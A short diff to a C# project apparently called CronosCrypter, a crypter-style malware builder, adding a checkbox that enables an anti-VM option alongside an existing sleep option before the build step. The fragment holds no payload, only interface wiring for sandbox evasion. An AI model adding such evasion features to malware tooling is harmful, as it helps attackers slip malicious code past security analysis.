@@ -133,7 +133,10 @@ namespace CronosCrypter
                     {
                         settings.doSleep = true;
                     }
-
+                    if (antiVM.CheckState == CheckState.Checked)
+                    {
+                        settings.doAntiVM = true;
+                    }
                     settings.buildDirectory = selectSaveDialog.FileName;
                                       
                     this.Build();
@@ -290,7 +293,6 @@ namespace CronosCrypter
                 sleepNum.Enabled = false;
             }
         }
-
         #endregion
     }
 }
